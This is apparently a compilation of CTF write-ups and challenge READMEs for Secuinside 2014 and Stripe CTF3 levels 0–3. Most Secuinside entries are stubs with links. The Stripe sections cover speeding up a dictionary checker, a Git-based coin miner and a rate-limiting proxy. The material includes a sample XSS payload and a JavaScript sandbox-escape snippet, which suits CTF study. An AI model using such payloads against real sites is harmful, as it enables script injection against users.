> [#9 About “XSS Bonsai” Runtime Environment]
>
> There is a problem when running Bonsai XSS, in that you can run the program but it will not correctly proceed past the first stage. However, it should work if you install Visual Studio Express 2013 Web (evaluation) or other versions of Visual Studio. We are sorry for the inconvenience but please install Visual Studio to fix this. You can test it by putting…
>
> ```
> ";alert('XSS');//
> ```
>
> …in stage 1. If you get a “Congratulations” alert box and pass to stage 2 then your environment is working. Good luck!
>
> [#10 About “XSS Bonsai” Runtime Environment 2]
>
> If you press the send button and nothing happens, please check and change IE Security Settings — Internet Zone as shown below.
>
> ![](bonsai-ie-settings.png)

## Write-up

(TODO)

## Other write-ups and resources

* <https://gist.github.com/tyage/e813031d14b39bfe3133>
* <https://rzhou.org/~ricky/seccon2014/xss_bonsai/>
# 2014 Secuinside CTF Prequal: JavaScript jail

**Category:** Misc
**Points:** 200
**Description:**

> 54.178.218.50 6789

## Write-up

Provide replacement functions for `Math.random`, `Array.apply`, and `.map`
on the Array:

    Math.random = function(){return 1;};
    f = function(l) {
      print(l);
      var foo = Array(l);
      for (i=0;i<foo.length;i++) {
        foo[i] = Math.random() * 0x10000;
      }
      foo.map = function(){return foo};
      return foo;
    };
    Array.apply = function() { return f(30); };
    check(f);

## Other write-ups and resources

* [Matir's write-up](https://systemoverlord.com/blog/2014/06/02/secuinside-quals-2014-javascript-jail/)
* [Cugu's write-up](http://blog.cugu.eu/write-up-secuinside-ctf-2014-javascript-jail/)
* <http://blog.dul.ac/2014/06/SECUINSIDE_14/>
* <https://ucs.fbi.h-da.de/writeup-secuinside-ctf-quals-2014-jsjail/>
* <https://ctfcrew.org/writeup/62>
* <http://tasteless.eu/2014/06/secuinside-ctf-quals-2014-misc200/>
* <https://www.dropbox.com/sh/ytfak01xhkjkiwp/AAA06wPsZMQAbWdwcpDgfG37a/writeup-Javascriptjail.pdf>
# 2014 Secuinside CTF Prequal: Lupin III

**Category:** Brain fuzzer
**Points:** 100
**Description:**

> Help Lupin to get Cherry Sapphire!
>
> Server 1 - 54.198.73.164:5555
> Server 2 - 54.81.138.191:5555
>
> It does not take long time to solve quiz. (8 min by reference solution.)

## Write-up

(TODO)

## Other write-ups and resources

* <http://ctfcrew.org/writeup/59>
# 2014 Secuinside CTF Prequal: Mic Check

**Category:** Speed Game
**Points:** 7
**Description:**

> `Q2QnT29oUNW0wtWqySDbw2UhvRIkTRrby2Qdx2g0UOjbwCHoTRrpw3Ei`

## Write-up

The given string looks like a base64 encoded string. However, decoding it does not reveal anything legible:

```bash
$ base64 --decode <<< 'Q2QnT29oUNW0wtWqySDbw2UhvRIkTRrby2Qdx2g0UOjbwCHoTRrpw3E' | xxd
0000000: 4364 274f 6f68 50d5 b4c2 d5aa c920 dbc3  Cd'OohP...... ..
0000010: 6521 bd12 244d 1adb cb64 1dc7 6834 50e8  e!..$M...d..h4P.
0000020: dbc0 21e8 4d1a e9                        ..!.M..
```

So it might be encrypted with a cipher, lets try the go-to caesar cipher and decrypt all rot combinations, e.g. using [this code](https://github.com/YASME-Tim/crypto-tools/blob/master/rot/rot.py).

```bash
$ for i in {0..52}; do python rot.py $i 'Q2QnT29oUNW0wtWqySDbw2UhvRIkTRrby2Qdx2g0UOjbwCHoTRrpw3E'; done
Q2QnT29oUNW0wtWqySDbw2UhvRIkTRrby2Qdx2g0UOjbwCHoTRrpw3E
Q2QnT29oUNW0wtWqySDbw2UhvRIkTRrby2Qdx2g0UOjbwCHoTRrpw3E
Q2QnT29oUNW0wtWqySDbw2UhvRIkTRrby2Qdx2g0UOjbwCHoTRrpw3E
[...]
Q2QmT29nUNW0vsWpxSDav2UguRIjTRqax2Qcw2f0UOiavCHnTRqov3E
P2PnS29oTMV0wtVqyRCbw2ThvQHkSQrby2Pdx2g0TNjbwBGoSQrpw3D
Q2QnT29oUNW0wtWqySDbw2UhvRIkTRrby2Qdx2g0UOjbwCHoTRrpw3E
```

Note that my code tries several options (Rotate lowercase only, rotate uppercase only, rotate seperate from each other or rotate over lower concatted with upper alphabet).

After decrypting each result, we find that `V2VsY29tZSB0byBvdXIgb2ZmaWNpYWwgd2Vic2l0ZTogbHMtYWwub3J` is the base64 encoded string we are looking for.

It yields the flag `Welcome to our official website: ls-al.`.
## Other write-ups and resources

* <http://atdog.logdown.com/posts/2014/06/02/secuinside-2014-ctf-misc-7>
* <https://ucs.fbi.h-da.de/writeup-secuinside-ctf-quals-2014-speed-games/>
* <http://hacktracking.blogspot.de/2014/06/secuinside-ctf-quals-2k14-speed-game.html>
* <https://www.dropbox.com/sh/ytfak01xhkjkiwp/AABcoW-29SN9M4HZ_U7PNsDma/writeup-SpeedGame.pdf>
# 2014 Secuinside CTF Prequal: pillow

**Category:** Crypto
**Points:** 200
**Description:**

> Before sleeping, wooyaggo always read weird articles from internet.
> All you got is some binaries(not perfect) and network traffic from following command.
>
> ```bash
> wooyaggo@genius_anncc:~$ python pillow_reader.pyc 10.0.8.24 5151 "secret" [AdminKey]
> ```
>
> Follow instructions in the "secret" to get a flag.
>
> P.S. Bruteforce through network is not required.
> Anyone who disturbing others by huge traffic will be punished.
> `[AdminKey]` is not actual key for admin.
>
> Download URL: [http://54.242.26.86/pillow_06dccbe141b83e180df27d8d4dce01bd.zip](pillow_06dccbe141b83e180df27d8d4dce01bd.zip)
> http://goo.gl/p1fIhC
> Server: 219.240.37.153:5151
> 7z Password: tnpfkxhstnpfkxhs

## Write-up

(TODO)

## Other write-ups and resources

* <https://rdot.org/forum/showpost.php?s=1bb8b7aca198dbee39104f19a8fc1090&p=35847>
* <http://atdog.logdown.com/posts/2014/06/02/secuinside-2014-ctf-crypto-200>
* <http://hxp.io/blog/6/SECUINSIDE+CTF+Quals+2014:+crypto200+%22pillow%22/>
* <https://www.dropbox.com/sh/ytfak01xhkjkiwp/AADhpnghprgulAAneBLdAZbSa/writeup-pillow.pdf>
* <https://blog.inexplicity.de/secuinside-2014-pillow-writeup.html># 2014 Secuinside CTF Prequal: rarara

**Category:** Reversing
**Points:** 300
**Description:**

> [Down](rarara.7z)
> 7z Password: tnpfkxhstnpfkxhs

## Write-up

(TODO)

## Other write-ups and resources

* <http://0xawes0me.github.io/writeups/2014/06/12/rarara/>
* <http://pastebin.com/GB2MUEXV>
# 2014 Secuinside CTF Prequal

* [Main website](http://ctf.secuinside.com/)
* [Scoreboard](http://ctf.secuinside.com/) or [local alternative](scoreboard.txt)

## Completed write-ups

* [mic-check](mic-check)

## External write-ups only

* [javascript-jail](javascript-jail)
* [Lupin III](lupin-iii)
* [pillow](pillow)
* [rarara](rarara)
* [simple-login](simple-login)
* [the-greatest-physicists](the-greatest-physicists)
* [this-is-not-bad](this-is-not-bad)
* [yayaya](yayaya)
* [yet-another-javascript-jail](yet-another-javascript-jail)

## Missing write-ups

* [tears-in-wooyaggo](tears-in-wooyaggo)
* [wooyatalk](wooyatalk)
* [yaggoya](yaggoya)
# 2014 Secuinside CTF Prequal: Simple login

**Category:** Web
**Points:** 200
**Description:**

> <http://219.240.37.153:5959/63972dfdacc8a838f618275d80d27c1d_h/>
> Source: [http://219.240.37.153:5959/63972dfdacc8a838f618275d80d27c1d.7z](63972dfdacc8a838f618275d80d27c1d.7z)

## Write-up

(TODO)

## Other write-ups and resources

* <http://h4des.org/blog/index.php?/archives/344-Secuinside-CTF-Prequal-2014-Simple-login-web200-write-up.html>
* <https://rdot.org/forum/showpost.php?s=1bb8b7aca198dbee39104f19a8fc1090&p=35847>
* <http://ctfcrew.org/writeup/61>
* <https://systemoverlord.com/blog/2014/06/04/secuinside-quals-2014-simple-login/>
* <https://www.dropbox.com/sh/ytfak01xhkjkiwp/AADwArQHT-0AdBcT3q4rSprXa/writeup-web200.pdf>
# 2014 Secuinside CTF Prequal: Tears in Wooyaggo

**Category:** Reversing
**Points:** 200
**Description:**

> [http://54.242.26.86/f996d3b09642c57c42e40c4ed2d0c35b.zip](f996d3b09642c57c42e40c4ed2d0c35b.zip)
> passwd : dndiRhdmlsnsanf!!!
> key?

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# 2014 Secuinside CTF Prequal: The greatest physicists

**Category:** Web
**Points:** 100
**Description:**

> find the flag

> <http://219.240.37.153:5959/1fa9027aaad62dc464bbc7d18edeb0f8_v/>
>
> id : physicist
> pw : q5xli0j3qklgcwxedeml8g5ovljqfdps

## Write-up

(TODO)

## Other write-ups and resources

* <https://rdot.org/forum/showpost.php?s=1bb8b7aca198dbee39104f19a8fc1090&p=35851>
* <https://www.dropbox.com/sh/ytfak01xhkjkiwp/AABOANajMia9WSMxbPmHil0da/writeup-thegreatestphysicists.pdf>
* <http://tasteless.eu/2014/06/secuinside-ctf-quals-2014-web100/>
# 2014 Secuinside CTF Prequal: this is not bad

**Category:** Shellcode
**Points:** 100
**Description:**

> [54.178.232.195/sc.tar](sc.tar)
> server: 54.178.232.195:5757

## Write-up

(TODO)

## Other write-ups and resources

* <https://rdot.org/forum/showpost.php?s=1bb8b7aca198dbee39104f19a8fc1090&p=35847>
* <https://systemoverlord.com/blog/2014/06/02/secuinside-quals-2014-shellcode-100/>
* <https://www.dropbox.com/sh/ytfak01xhkjkiwp/AABRPW0wJ5wHGDRkr3t7MZ-xa/writeup-Thisisnotbad.pdf>
* <http://tasteless.eu/2014/06/secuinside-ctf-quals-2014-shellcode100/>
# 2014 Secuinside CTF Prequal: wooyatalk

**Category:** Mobile
**Points:** 300
**Description:**

> [http://54.242.26.86/dff48e42f3af185539a7fa3ccbe5a458.zip](dff48e42f3af185539a7fa3ccbe5a458.zip)
> passwd : 08cc850c4b3c7deb5b836378ac66677
> key?

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# 2014 Secuinside CTF Prequal: yaggoya

**Category:** Reversing
**Points:** 200
**Description:**

> [http://54.242.26.86/b1e348ecbe3e597edd0060b737b0fab5.zip](b1e348ecbe3e597edd0060b737b0fab5.zip)
> passwd: 3914da6a5e282df6d133bbc79d7c72b8
> key?

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# 2014 Secuinside CTF Prequal: yayaya

**Category:** Reversing
**Points:** 100
**Description:**

> [Down](yayaya.zip)
> Zip Password: `aaaaaaaaaa`

## Write-up

(TODO)

## Other write-ups and resources

* <http://ctfcrew.org/writeup/60>
* <http://hacktracking.blogspot.de/2014/06/secuinside-ctf-quals-2k14-yayaya.html>
* <https://www.dropbox.com/sh/ytfak01xhkjkiwp/AACLCp4qmRS4dR1f6Yx4Z1sja/writeup-yayaya.pdf>
* <http://apelord.net/posts/secuinside-ctf-quals-2014--reversing-100-yayaya>
# 2014 Secuinside CTF Prequal: Yet another JavaScript jail

**Category:** Pwn
**Points:** 300
**Description:**

> server1: 54.178.138.53 9876
> server2: 54.178.225.123 9876

## Write-up

(TODO)

## Other write-ups and resources

* <https://www.dropbox.com/s/2obg5ev1y9mrvvx/writeup-YetanotherJavascriptjail.pdf>
# Level 0

## Usage

To submit your code, first commit, and then run `git push`.

Only the program input will vary; we'll always run against the same
dictionary (`test/harness` will download that dictionary for you if
you don't have it).

See https://stripe-ctf.com for context on this level.

## Observations

It's hard to know what this script does, but it seems to take time
depending on the size of the input:

    $ time ./level0 < short.txt >/dev/null

    real  0m1.231s
    user  0m1.132s
    sys   0m0.096s

Compare to:

    $ time ./level0 < long.txt >/dev/null

    real  0m14.060s
    user  0m12.952s
    sys   0m1.104s

`wc -c` shows that long.txt is about 10 times larger than short.txt,
so it seems like the runtime grows linearly with input size. Since it
also has to read the entire input, there's not going to be a way to do
better than a linear-time solution.

## Catalog

- `build.sh`: We'll run this file before trying to run your code. This
  is likely only relevant if you rewrite in another language, but it
  also could be useful for something like fetching dependencies via
  Bundler. Feel free to modify it arbitarily; we'll run the modified
  version on our build servers. (https://stripe-ctf.com/about#build
  has more information on the build process.)

- `level0`: The mysterious program. Why so slow?

- `long.txt`: An example long input file.

- `short.txt`: An example short input file.

- `README.md`: This file :).

- `test/*`: A framework to make it easy for you to run test cases
  locally. You should only ever have to run `test/harness`.
# Stripe CTF3: level0

## Challenge

Your challenge is to make [this code](https://github.com/ctfs/write-ups/blob/master/stripe-ctf3/level0/problem/level0) run much faster, without altering its output. In particular, you need to get it running at least as fast as our reference solution — when you submit a revision, we’ll tell you how our solution compares.

## Write-up

[The provided `level0` file](https://github.com/ctfs/write-ups/blob/master/stripe-ctf3/level0/problem/level0) is a Ruby script that accepts text as input, and then returns that text with any words that are not in the dictionary wrapped in angle brackets.

```ruby
#!/usr/bin/env ruby

# Our test cases will always use the same dictionary file (with SHA1
# 6b898d7c48630be05b72b3ae07c5be6617f90d8e). Running `test/harness`
# will automatically download this dictionary for you if you don't
# have it already.

path = ARGV.length > 0 ? ARGV[0] : '/usr/share/dict/words'
entries = File.read(path).split("\n")

contents = $stdin.read
output = contents.gsub(/[^ \n]+/) do |word|
  if entries.include?(word.downcase)
    word
  else
    "<#{word}>"
  end
end
print output
```

Running [the provided test harness](https://github.com/ctfs/write-ups/blob/master/stripe-ctf3/level0/problem/test/harness) yields the following output:

```bash
$ ./test/harness
No test case supplied. Randomly choosing among defaults.
Fetching. URL: https://stripe-ctf-3.s3.amazonaws.com/level0/level0-znKqYRKUDB.json
About to run test case: level0-znKqYRKUDB
Beginning run.
Finished run
Test case passed. Your time: 5.291982 seconds. Benchmark time: 0.672016 seconds. You/Benchmark: 7.874785
```

The goal of the level was to make this code more efficient, so that it’s faster than the benchmark.

The improvement that first comes to mind is to use a set or a hash table instead of an array to store the dictionary entries. That way, any lookups can be performed in `O(1)` (constant time).

```diff
diff --git a/level0 b/level0
index f320a7d..1333337 100755
--- a/level0
+++ b/level0
@@ -7,10 +7,11 @@

 path = ARGV.length > 0 ? ARGV[0] : '/usr/share/dict/words'
 entries = File.read(path).split("\n")
+table = Hash[entries.zip(Array.new(entries.size, true))]

 contents = $stdin.read
 output = contents.gsub(/[^ \n]+/) do |word|
-  if entries.include?(word.downcase)
+  if table[word.downcase]
     word
   else
     "<#{word}>"
```

[This solution](https://github.com/ctfs/write-ups/blob/master/stripe-ctf3/level0/level0) is already faster than the reference solution:

```bash
$ ./test/harness
No test case supplied. Randomly choosing among defaults.
About to run test case: level0-znKqYRKUDB
Beginning run.
Finished run
Test case passed. Your time: 0.254984 seconds. Benchmark time: 0.672016 seconds. You/Benchmark: 0.379432
```

Level solved!

For more points, you could implement a [trie](http://en.wikipedia.org/wiki/Trie) data structure such as a [MARISA trie](https://code.google.com/p/marisa-trie/) to store the dictionary entries.

## Other write-ups or solutions

* <http://abiusx.com/stripe-ctf-v3-writeup/>
* <http://tullo.ch/articles/stripe-ctf-golfing/>
* <http://muehe.org/posts/stripe-ctf-3-writeup/>
* [Gibybo’s write-up](https://news.ycombinator.com/item?id=7180991)
* [Jon Eisen’s write-up](http://blog.joneisen.me/post/75008410654)
* [Evan Priestley’s write-up](http://blog.phacility.com/post/stripe_ctf3/)
* [Samuel Walker’s write-up](http://www.samuelwalker.me.uk/2014/01/stripe-ctf3-write-up/)
* [@paraboul’s 3rd place solution](https://gist.github.com/paraboul/8735537)
* <https://github.com/henrik-muehe/level0>
* <https://github.com/metcalf/ctf3/tree/master/level0>
* <https://github.com/xthexder/stripe-ctf-3.0>
* <https://github.com/vinzenz/stripe-ctf3-solutions/tree/master/level0>
* <https://github.com/kratorius/stripe-ctf3/tree/master/level0>
* <https://github.com/lericson/stripe-ctf3/tree/level0>
* [Original problems including a modified test harness that works locally](https://github.com/janosgyerik/stripe-ctf3)
# Gitcoin

Welcome to the wonderful world of Gitcoin!

## Overview

The balances are all contained in `LEDGER.txt`. We also have provided
you with a sample Gitcoin mining script in `miner` -- you'll probably
notice it's too slow to use in practice though. Note that for this
level you won't submit any code to us, as you'll be running everything
locally (you're welcome to email us solutions if you think they are
particularly cool, though).

The only commits that can be pushed are ones that:

- Increments an existing ledger entry by 1, or adds a new ledger entry
  with balance: 1; and
- Has a SHA1 lexicographically less than the value in `difficulty.txt`.

Add yourself to `LEDGER.txt` to pass the level (worth 50 points), at
which points the bots will stop.

Once you're done, check your account page to advance to the global
Gitcoin instance, where you can earn unbounded numbers of leaderboard
points.

Note that until you pass the level we'll periodically start a new
Gitcoin instance, at which point you'll have to run `git reset --hard
origin/master` to reset your clone's state.

## Catalog

- `difficulty.txt`: A strict upper bound on valid Gitcoin SHA1 values.

- `miner`: A sample Gitcoin mining script.

- `LEDGER.txt`: The current Gitcoin balances.

- `README.md`: This file.
# Stripe CTF3: level1

## Description

Cryptocurrencies are all the rage these days. Thus, today we’re proud to announce the release of a new one, entitled Gitcoin.

It’s easy to start a new Gitcoin instance: you start with a Git repository containing a `LEDGER.txt` file, which represents the starting balances (denoted in the form `username: <balance>`). You then transact by committing balance updates to the repository. A valid ledger might look like this:

```
Private Gitcoin ledger
==============
siddarth: 52
nelhage: 23
woodrow: 41
ludwig: 151
```

There’s a twist, however: in order to push a new commit, that commit’s SHA1 must be lexicographically less than the value contained in the repository’s `difficulty.txt` file. For instance, a commit in a Gitcoin blockchain with difficulty `00005` might look something like the following:

```diff
commit 00004216ba61aecaafb11135ee43b1674855d6ff7
Author: Alyssa P Hacker <alyssa@example.com>
Date:   Wed Jan 22 14:10:15 2014 -0800

    Give myself a Gitcoin

    nonce: tahf8buC

diff --git a/LEDGER.txt b/LEDGER.txt
index 3890681..41980b2 100644
--- a/LEDGER.txt
+++ b/LEDGER.txt
@@ -7,3 +7,4 @@ andy: 30
 carl: 12
 gdb: 45
 pa: 30
+user-hpbsuozt: 1
```

However, it wouldn’t be valid if `difficulty.txt` contained `00003` or `000001`.

The Git repository’s history thus forms a blockchain with a proof-of-work for each block, just like in Bitcoin. Of > course, unlike Bitcoin, Gitcoin just uses Git and doesn’t require a custom client.

Gitcoins are mined by adding yourself to [the `LEDGER.txt`](https://github.com/ctfs/write-ups/blob/master/stripe-ctf3/level1/problem/LEDGER.txt) with 1 Gitcoin (or incrementing your entry if already present) in a commit with an allowable SHA1. For simplicity, the ledger is maintained centrally and never rolled back (though, there’s no inherent reason we couldn’t decentralize Gitcoin, since it’s built off of the same foundation as Bitcoin).

To beat the level (and gain 50 points), you need to mine a Gitcoin. You’ll be competing against our own mining bot swarm, so you’ll need to out-compute them. (Note that as soon as one of them mines a Gitcoin, you’ll have to throw out all your work and start your search again from the new base commit.)

You can obtain your personal Gitcoin instance here:

```bash
git clone lvl1-qfrfxagh@stripe-ctf.com:level1
```

Your public username for this level is `user-hpbsuozt`, so a winning commit must add `user-hpbsuozt: 1` to the ledger.

To get you started, we’ve included [a sample miner implementation in your Gitcoin instance](https://github.com/ctfs/write-ups/blob/master/stripe-ctf3/level1/problem/miner). The miner is far too slow to use in practice though.

We’ll start a new Gitcoin instance every 15 minutes in order to keep history short. You should run `git reset --hard origin/master` when this happens in order to reset your clone’s state.

## Write-up

The bottleneck in the provided [`miner` script](https://github.com/ctfs/write-ups/blob/master/stripe-ctf3/level1/problem/miner) is the following code, found within a hot loop:

```bash
body="tree $tree
parent $parent
author CTF user <me@example.com> $timestamp +0000
committer CTF user <me@example.com> $timestamp +0000

Give me a Gitcoin

$counter"

# See http://git-scm.com/book/en/Git-Internals-Git-Objects for
# details on Git objects.
sha1=$(git hash-object -t commit --stdin <<< "$body")
```

This code generates a Git commit object and computes its hash. Because a new `git` process is launched for every commit object we want to check, this is pretty slow. The key to solving this challenge is to [re-implement Git’s object hashing](http://git-scm.com/book/en/Git-Internals-Git-Objects#Object-Storage) ourselves.

I ended up rewriting the entire `miner` script in Python — see [`miner.py`](https://github.com/ctfs/write-ups/blob/master/stripe-ctf3/level1/miner.py). Use it as follows:

```bash
$ ./miner.py lvl1-qfrfxagh@stripe-ctf.com:level1 user-hpbsuozt
Mining…
Mined a Gitcoin! The SHA-1 is:
00000037948a0bc8e05e3f85c3198636362c9f40
HEAD is now at 00000037 Give me a Gitcoin
To lvl1-qfrfxagh@stripe-ctf.com:level1
 ! [rejected]        master -> master (fetch first)
error: failed to push some refs to 'lvl1-qfrfxagh@stripe-ctf.com:level1'
hint: Updates were rejected because the remote contains work that you do
hint: not have locally. This is usually caused by another repository pushing
hint: to the same ref. You may want to first integrate the remote changes
hint: (e.g., 'git pull ...') before pushing again.
hint: See the 'Note about fast-forwards' in 'git push --help' for details.
Starting over :(
Mining…
Mined a Gitcoin! The SHA-1 is:
00000068d3ff02e5a12967049697ab532ef2b19b
HEAD is now at 00000068 Give me a Gitcoin
Counting objects: 5, done.
Delta compression using up to 8 threads.
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 398 bytes | 0 bytes/s, done.
Total 3 (delta 1), reused 0 (delta 0)
remote: ===================
remote:
remote: Congratulations, user-hpbsuozt! You've just earned your first Gitcoin. Your leaderboard score is 50.
remote:
remote:
remote: The bots will stop now. You can run `git clone lvl1-qfrfxagh@stripe-ctf.com:current-round` to go head-to-head against other Gitcoin miners and earn more points.
remote:
remote: ===================
To lvl1-qfrfxagh@stripe-ctf.com:level1
   000000ae..00000068 master -> master
Success :)
```

## Other write-ups or solutions

* <http://abiusx.com/stripe-ctf-v3-writeup/>
* <http://tullo.ch/articles/stripe-ctf-golfing/>
* <http://muehe.org/posts/stripe-ctf-3-writeup/>
* [Gibybo’s write-up](https://news.ycombinator.com/item?id=7180991)
* [Jon Eisen’s write-up](http://blog.joneisen.me/post/75008410654)
* [Evan Priestley’s write-up](http://blog.phacility.com/post/stripe_ctf3/)
* [Samuel Walker’s write-up](http://www.samuelwalker.me.uk/2014/01/stripe-ctf3-write-up/)
* <https://github.com/henrik-muehe/level1>
* <https://github.com/xthexder/stripe-ctf-3.0>
* <https://github.com/kratorius/stripe-ctf3/tree/master/level1>
* <https://github.com/lericson/stripe-ctf3/tree/level1>
* [Solution in Haskell](https://gist.github.com/yanatan16/a4517f4804166855c58a)
* [Solution in C/CUDA](https://github.com/metcalf/ctf3/tree/master/level1)
* [Original problems including a modified test harness that works locally](https://github.com/janosgyerik/stripe-ctf3)
# Level 2

## Getting started

As in Level 0, you can run this level using `test/harness` and you can it
submit for scoring using `git push`. Your goal is to modify the
reverse proxy in `shield` to create a defensive proxy that mitigates
floods of malicious traffic. When you submit your `shield` for
scoring, we will run it using a copy of the network simulation code
that is available in `network_simulation/`.

To run the provide code, you will need a Node.js installation. See:

  http://nodejs.org

## Building

The provided `./build.sh` will install the level's Node.js
dependencies using the Node Package Manager (`npm`). Remember that
this build script will be run on our scoring servers to build your
submitted code, and you can modify it however you want.

## Included files

* `./shield` and `./build.sh`: You should modify these!
* `./network_simulation/`: a copy of the simulation code that we run on
  our servers. They are provided for your reference and for local
  simulations. We maintain our own copies of them for purposes of
  scoring.
** `backend.js`: the code for the fragile backend servers
** `sword.js` the code that simulates the malicious and legitimate
  traffic against the backends
* `./network_simulation/lib/`: some Node.js modules that are shared by the rest of the
  included code. Yours to modify (although you often won't need to).

## The simulation and scoring

### The layout of the simulated network

The network has three components: your proxy (`shield`), backends, and
clients. The standard configuration, used for scoring and used by
`test/harness`, is to have a backend listen on port 3001 and a second
on 3002. Then `shield` connects to the two backends and listens on
port `3000`. Then `sword.js` is run, and it simulates a swarm of many
clients (some legitimate and some malicious) connecting to the proxy.
Although there are two backends in the scoring simulation, the stub
code in `shield` does not perform any load balancing unless you modify
it to do so.

Technical note: the simulation framework uses HEAD requests to check
the upness of the `shield` and backends (it won't run until they're
up). If you are doing a major re-write, you should preserve the
current semantics around HEAD (see the `sword.js` source for more).

## The scoring

In the simulated environment, there are a large number of legitimate
clients making just a few requests each. There are also a small
number of malicious clients making an enormous number of requests
each. Think of these as mice and elephants: the goal of the level is
to let the mice through while keeping the elephants out.

The scoring simulation runs for 20 seconds. During that period, you
receive one point each time that you successfully proxy a response to
a request that was made by a mouse. At the end of the 20 seconds, you
lose points in proportion to the idleness of your backend boxes
(i.e. if you don't have an opportunity to proxy a mouse request, it is
better to proxy an elephant request than do nothing).

When the requests are coming in they are not labeled as
legitimate or malicious. However, the originating IP is
identified by the 'X-Forwarded-For' header on each packet. You can
determine, by watching the network whether an IP is malicious. A
given IP is either always malicious or always legitimate


# Stripe CTF3: level2

## Description

You get a frantic late-night call from the ops team of a major online service provider: “We’ve been hit by this massive DDOS attack,” they say. “It’s a hundred times our normal traffic and we’re dropping requests every ms. Our clients can’t get through and their trust in us is crumbling. Please, you’ve got to do something.”

The targeted company runs a fleet of fragile backend boxes that perform expensive computation on each inbound request. They’ve asked you not to muck around with those internal boxes. Instead, you need to build a defensive proxy layer to drop between the attackers and the backends. The proxy needs to blackhole the attackers while allowing legitimate users to get through.

For this level, the besieged ops team has provided [a bare-bones reverse proxy written in Node.js](https://github.com/ctfs/write-ups/blob/master/stripe-ctf3/level2/problem/shield). The existing proxy is just a stub, and it does nothing to separate malicious and legitimate traffic. You can expand it or write your own from scratch.

[The repo’s `README.md`](https://github.com/ctfs/write-ups/blob/master/stripe-ctf3/level2/problem/README.md) gives helpful detail. In the repo, we’ve also included code to simulate the network environment described in our story: fragile backends and an onslaught of legitimate and malicious traffic. You can test and score your proxy inside this simulation by running `test/harness`.

## Write-up

[The provided `shield` script](https://github.com/ctfs/write-ups/blob/master/stripe-ctf3/level2/problem/shield) contains the following code:

```js
var Queue = function (proxies, parameters) {
  this.proxies = proxies;
  this.parameters = parameters;
};
Queue.prototype.takeRequest = function (reqData) {
  // Reject traffic as necessary:
  // if (currently_blacklisted(ipFromRequest(reqData))) {
  //   rejectRequest(reqData);
  //   return;
  // }
  // Otherwise proxy it through:
  this.proxies[0].proxyRequest(reqData.request, reqData.response, reqData.buffer);
};
```

There are two parts to this challenge:

1. implement load balancing (i.e. making use of all the available proxies instead of just `proxies[0]`)
2. implement rate-limiting (i.e. blacklist IP addresses that attempt to DDoS somehow)

I’ve implemented load balancing as follows:

```diff
diff --git a/shield b/shield
index 4796d2a..1333337 100755
--- a/shield
+++ b/shield
@@ -27,6 +27,7 @@ var Queue = function (proxies, parameters) {
   this.proxies = proxies;
   this.parameters = parameters;
 };
+var proxyIndex = 0;
 Queue.prototype.takeRequest = function (reqData) {
   // Reject traffic as necessary:
   // if (currently_blacklisted(ipFromRequest(reqData))) {
@@ -34,7 +35,9 @@ Queue.prototype.takeRequest = function (reqData) {
   //   return;
   // }
   // Otherwise proxy it through:
-  this.proxies[0].proxyRequest(reqData.request, reqData.response, reqData.buffer);
+  var proxies = this.proxies;
+  proxies[proxyIndex].proxyRequest(reqData.request, reqData.response, reqData.buffer);
+  proxyIndex = (proxyIndex + 1) % proxies.length;
 };
 Queue.prototype.requestFinished = function () {
   return;
```

My rate-limiting solution was a quick and dirty one that turned out to be sufficient to pass this level:

```diff
diff --git a/shield b/shield
index 1333337..9000001 100755
--- a/shield
+++ b/shield
@@ -23,6 +23,17 @@ function rejectRequest(reqData) {
   reqData.response.end();
 }

+var hash = Object.create(null);
+var MAX_REQUESTS = 7; // the number `7` was chosen after some trial and error
+function currently_blacklisted(ip) {
+  var value = hash[ip];
+  if (value != null) {
+    hash[ip]++;
+  } else {
+    hash[ip] = 0;
+  }
+  return value >= MAX_REQUESTS;
+}
+
 var Queue = function (proxies, parameters) {
   this.proxies = proxies;
   this.parameters = parameters;
@@ -30,10 +41,10 @@ var Queue = function (proxies, parameters) {
 var proxyIndex = 0;
 Queue.prototype.takeRequest = function (reqData) {
   // Reject traffic as necessary:
-  // if (currently_blacklisted(ipFromRequest(reqData))) {
-  //   rejectRequest(reqData);
-  //   return;
-  // }
+  if (currently_blacklisted(ipFromRequest(reqData))) {
+    rejectRequest(reqData);
+    return;
+  }
   // Otherwise proxy it through:
   var proxies = this.proxies;
   proxies[proxyIndex].proxyRequest(reqData.request, reqData.response, reqData.buffer);
```

After running [the patched file](https://github.com/ctfs/write-ups/blob/master/stripe-ctf3/level2/level2) through the test harness, we get output similar to:

```bash
$ ./test/harness
…
Test case passed. Your score: 181.541667. Benchmark score: 127.416667. You/Benchmark: 1.424787. You handled 247 legitimate responses and you received 65.46 negative points for idle time on the backends. The benchmark handled 222 and received 94.58 negative points.
```

Hungry for a higher score, and noticing the scores (both mine and the benchmark’s) were fluctuating heavily even for identical test runs, I just kept on re-submitting the same solution to the CTF server for a few hours:

```bash
$ while :; do git push; done
```

This netted me [a score of 251](https://stripe-ctf.com/achievements/mathias) for this level (11th place on the leaderboard!).

## Other write-ups or solutions

* <http://abiusx.com/stripe-ctf-v3-writeup/>
* <http://tullo.ch/articles/stripe-ctf-golfing/>
* <http://muehe.org/posts/stripe-ctf-3-writeup/>
* [Gibybo’s write-up](https://news.ycombinator.com/item?id=7180991)
* [Jon Eisen’s write-up](http://blog.joneisen.me/post/75008410654)
* [Evan Priestley’s write-up](http://blog.phacility.com/post/stripe_ctf3/)
* [Samuel Walker’s write-up](http://www.samuelwalker.me.uk/2014/01/stripe-ctf3-write-up/)
* <https://github.com/henrik-muehe/level2>
* <https://github.com/metcalf/ctf3/tree/master/level2>
* <https://github.com/xthexder/stripe-ctf-3.0>
* <https://github.com/kratorius/stripe-ctf3/tree/master/level2>
* <https://github.com/lericson/stripe-ctf3/tree/level2>
* [Original problems including a modified test harness that works locally](https://github.com/janosgyerik/stripe-ctf3)
# Level 3

## API

Instant Code Search defines the following HTTP endpoints. All of them
return JSON.

- /healthcheck:
Returns '{"success": "true"}' if all the nodes are up and ready to receive
requests.

- /index?path=PATH:
Takes a path on the filesystem and indexes it.

- /isIndexed:
Returns '{"success": "true"}' if all the nodes have indexed paths, and are
ready to receive queries.

- /?q=QUERY
Returns any file and line number in the indexed path. The response is of
this form:

    {
      "success": true,
      "results": [
        "path/to/file1:5",
        "path/to/another/file:33",
        ...
      ]
    }

All of these endpoints have been implemented, but we could use your expertise
in making the query endpoint a _lot_ faster.

## Usage

To start a specific server, run `bin/start-server`. This looks to see if
